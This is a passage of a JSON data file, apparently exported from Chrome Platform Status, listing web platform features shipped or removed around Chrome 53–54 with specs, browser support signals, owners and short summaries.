        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "webview": 54,
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The getRootNode(options) attribute’s getter must return context object’s shadow-including root if options’s composed is true, and context object’s root otherwise.\r\n\r\nThe former name was Node.rootNode.\r\nSee https://github.com/whatwg/dom/issues/241 the context of renaming",
    "id": 5736827696709632,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:56.894450",
      "by": "ericbidelman@google.com"
    },
    "name": "Object.entries() and Object.values()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://tc39.github.io/proposal-object-values-entries/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1232639",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "rossberg@chromium.org",
          "caitpotter88@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4663",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=150131",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "These methods are siblings to the Object.keys() function, and aim to provide Objects with the same set of iteration methods that exist for other ES2015 types (Array, Map, and Set).",
    "id": 5710160244768768,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/entries",
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/values"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2017-06-14 18:28:51.848030",
      "by": "ericbidelman@google.com"
    },
    "name": "PushSubscription.options",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/push-api/#idl-def-PushSubscription",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1247685",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "johnme@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "bug": "https://crbug.com/626627",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "An \"options\" attribute is added to PushSubscription objects that the PushManager.subscribe(...) and getSubscription() promises resolve to. It reflects the options passed in when subscribing.\r\n\r\nThis allows web developers to see what applicationServerKey each PushSubscription is associated with, and hence what key their server will need to present when sending messages. Previously web developers with more than one applicationServerKey had to keep track of this separately (e.g. in IndexedDB).",
    "id": 5678199010754560,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/09/options-of-a-pushsubscription"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:39.213620",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove KeyEvent.keyIdentifier",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/uievents/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 54
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://crbug.com/607349",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the WebKit specific KeyEvent.keyIdentifier field.\r\n\r\nIt is not specified in a current specification and has a number of interoperability concerns.\r\n\r\nThe KeyboardEvent.key field is a suitable specified replacement for this field.",
    "id": 5316065118650368,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/keyIdentifier"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:50.831290",
      "by": "ericbidelman@google.com"
    },
    "name": "Request fullscreen on orientation change",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fullscreen.spec.whatwg.org/#allowed-to-request-fullscreen",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/fullscreen/issues/34",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "mlamouri@chromium.org",
          "zqzhang@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://crbug.com/628603",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allow web pages to request fullscreen while an orientation change event handler is running. This will allow pages to go fullscreen when the user turn their device.",
    "id": 5671161102860288,
    "resources": {
      "samples": [
        "https://mounirlamouri.github.io/sandbox/fullscreen-orientation.html"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:44.444020",
      "by": "ericbidelman@google.com"
    },
    "name": "SRI: The `require-sri-for` CSP directive.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec-subresource-integrity/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1265318",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 54
        },
        "owners": [
          "shekyan@gmail.com",
          "jww@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": true,
        "android": 54,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=618924",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The `require-sri-for` directive gives developers the ability to assert to the browser that every resource of a given type ought to be integrity checked. If a resource of that type is loaded without integrity metadata, it will be rejected without triggering a network request.",
    "id": 5635811978510336,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:29:15.715570",
      "by": "ericbidelman@google.com"
    },
    "name": "Size related attributes to Resource Timing API",
    "tags": [
      "transferSize",
      "resource timing",
      "size",
      "cache"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/resource-timing/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1154309",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "kenjibaheux@chromium.org",
          "ricea@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "http://crbug.com/611278",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add size related attributes to Resource Timing API\r\n\r\nChanges to API surface:\r\nAdd 3 attributes (transfer/encoded/decoded sizes)",
    "id": 6549060404117504,
    "resources": {
      "docs": [
        "https://lists.w3.org/Archives/Public/public-web-perf/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:59.104160",
      "by": "ericbidelman@google.com"
    },
    "name": "Unprefixed CSS user-select",
    "tags": [
      "CSS"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-ui-4/#content-selection",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "yoichio@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "ios": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=605419",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The user-select property enables authors to specify which elements in the document can be selected by the user and how.\r\nChrome has supported only prefixed version: -webkit-user-select.",
    "id": 5722186220306432,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1158E0YvlUJ5Lwd-8XZBFqE2Ow_FWLrNVik1MFqk3WRU/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:30.166030",
      "by": "ericbidelman@google.com"
    },
    "name": "imageSmoothingQuality attribute for CanvasRenderingContext2D",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/#imagesmoothingquality",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/html/issues/98#issuecomment-151681001",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 54
        },
        "owners": [
          "zmin@chromium.org",
          "junov@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 54,
        "blink_components": [
          "Blink"
        ],
        "desktop": 54,
        "flag": false,
        "android": 54,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=540761",
        "intervention": false
      },
      "opera": {
        "android": 41,
        "desktop": 41
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=149541",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "It allows a web developer to choose the quality/performance tradeoff when scaling images. There are 3 options in total: low, medium and high.\r\n",
    "id": 4717415682277376,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/CanvasRenderingContext2D/imageSmoothingQuality"
      ],
      "samples": [
        "https://jsfiddle.net/khru0mzj/",
        "https://drive.google.com/a/google.com/file/d/0BySFHAS13VhbRVBUM3dHaDV3VFU/view",
        ""
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:41.260320",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "'allow-presentation' sandboxing flag",
    "tags": [
      "presentation",
      "cast"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/presentation-api/#sandboxing-and-the-allow-presentation-keyword",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/presentation-api/issues/288",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "mfoltz@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://crbug.com/582574",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This is a new flag for `<iframe sandbox=\"...\">` which will \r\nallow embedders to have control over whether an iframe can start a presentation session.",
    "id": 5462833647058944,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:30.806630",
      "by": "ericbidelman@google.com"
    },
    "name": "Apply Unicode flag to `pattern' content attribute of INPUT element",
    "tags": [
      "pattern input unicode"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/forms.html#the-pattern-attribute",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "http://crbug.com/535441",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Apply the unicode flag to `pattern' attribute values. Syntax checking will be stricter, and '.' matches to a surrogate pair, and some other benefits.",
    "id": 4753420745441280,
    "resources": {
      "docs": [
        "https://mathiasbynens.be/notes/es6-unicode-regex"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:32.294350",
      "by": "ericbidelman@google.com"
    },
    "name": "Autoplay muted videos (Android)",
    "tags": [
      "video",
      "autoplay"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/WICG/interventions/issues/23#issuecomment-226103318",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "avayvod@chromium.org",
          "mlamouri@chromium.org",
          "zqzhang@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 53,
        "bug": "https://crbug.com/618000",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/safari/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Relax autoplay restrictions to allow muted videos to autoplay. They will only be able to play while muted and unmuting will pause if not coming from a user gesture.",
    "id": 4864052794753024,
    "resources": {
      "docs": [
        "https://github.com/whatwg/html/issues/976"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/muted-autoplay/index.html"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:35.318780",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS -webkit-user-select: all",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-ui-4/#content-selection",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/CSS/user-select",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "yoichio@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "ios": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=605419",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The user-select property enables authors to specify which elements in the document can be selected by the user and how.\r\nChrome has supported only prefixed version: -webkit-user-select.\r\n\r\nWith -webkit-user-select:all value,\r\nthe content of the element must be selected atomically: If a selection would contain part of the element, then the selection must contain the entire element including all its descendants. ",
    "id": 5062926088011776,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1158E0YvlUJ5Lwd-8XZBFqE2Ow_FWLrNVik1MFqk3WRU/edit?usp=sharing"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-08-16 16:35:39.426040",
      "by": "rouslan@chromium.org"
    },
    "name": "Deprecate PaymentAddress.careOf",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://github.com/w3c/browser-payment-api/issues/244",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 53
        },
        "owners": [
          "jinho.bang@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "android": 53,
        "bug": "http://crbug.com/648049",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The PaymentAddress interface has a careOf field which is non-standard (no well-known address\r\nstandards support it, see below). The careOf field is unnecessary, the recipient and organization fields\r\nsufficiently support all necessary use cases. Adding careOf poses significant issues in terms of\r\ninteroperability with existing postal address schemas and APIs.\r\n(From spec discussion: https://github.com/w3c/browser-payment-api/issues/244)\r\n\r\n",
    "id": 5728579069411328,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/WhUAKyc0O80"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:58.525050",
      "by": "ericbidelman@google.com"
    },
    "name": "Do not perform default action on un-trusted events",
    "tags": [
      "events",
      "un-trusted",
      "default action"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/uievents/#trusted-events",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://crbug.com/520519",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "url": "https://bugs.chromium.org/p/chromium/issues/detail?id=423975",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "According to the UI Events specification un-trusted events (i.e. those created by JavaScript) should not invoke the default action. 'click' is the only event that is a legacy permitted case.\r\n\r\nThe isTrusted support was added in https://www.chromestatus.com/features/6461137440735232 which identifies trusted events from un-trusted events.\r\n\r\nWe wish to prevent synthetic events from executing the default action, aligning with Firefox and IE.",
    "id": 5718803933560832,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:48.825670",
      "by": "ericbidelman@google.com"
    },
    "name": "Drop LABEL element from form-associated elements",
    "tags": [
      "html label form"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/forms.html#form-associated-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 53
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "http://crbug.com/607868",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The HTML specification was changed so that LABEL element isn't a form-associated element.\r\n\r\n- Remove `form' content attribute support from LABEL element\r\n- Change the behavior of `form' IDL attribute of LABEL element so that it returns the form owner of the associated control.\r\n\r\n",
    "id": 5661555072958464,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:50.932520",
      "by": "ericbidelman@google.com"
    },
    "name": "Force flattening for elements with opacity < 1",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-transforms/#grouping-property-values",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "chrishtr@chromium.org",
          "trchen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=617798",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "3D-positioned descendants will be flattened by an ancestor that has opacity.\r\n\r\nPreviously it did not, if that ancestor also specified transform-style: preserve-3d",
    "id": 5671480339726336,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1xdOyUKXYCKKcMJd8fFyuG0JLTi72ajqQx8h1w1MXKWw/edit#"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/css-opacity-force-flattening/index.html"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-11-24 09:59:30.530790",
      "by": "fbeaufort@google.com"
    },
    "name": "Media Source EventHandler attributes",
    "tags": [
      "EventHandler",
      "MSE",
      "MediaSource"
    ],
    "comments": "Changes to API surface:\r\nAttributes for MediaSource events:\r\n* onsourceopen\r\n* onsourceended\r\n* onsourceclose\r\n\r\nAttributes for SourceBuffer events:\r\n* onupdatestart\r\n* onupdate\r\n* onupdateend\r\n* onerror\r\n* onabort\r\n\r\nAttributes for SourceBufferList events:\r\n* onaddsourcebuffer\r\n* onremovesourcebuffer",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/media-source/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "wolenetz@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://crbug.com/623678",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/media-source/pull/75#issuecomment-217042068",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Per recent MSE spec change [1], MSE objects should have EventHandler attributes for their various events. The logic for the events does not change; this feature just adds support for them via EventHandler attributes.\r\n[1]  https://github.com/w3c/media-source/pull/75",
    "id": 5696773133697024,
    "resources": {
      "docs": [
        "https://github.com/w3c/media-source/issues/66",
        "https://github.com/w3c/media-source/pull/75"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:06.471340",
      "by": "ericbidelman@google.com"
    },
    "name": "MediaStreamTrack constraints API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/mediacapture-main/getusermedia.html#mediastreamtrack",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/543997",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support for the new format of MediaStreamTrack constraints.\r\n\r\nSupport for the API calls for getting, setting and querying constraints on a MediaStreamTrack.",
    "id": 5807737287999488,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaStreamTrack"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-04-09 18:30:34.246230",
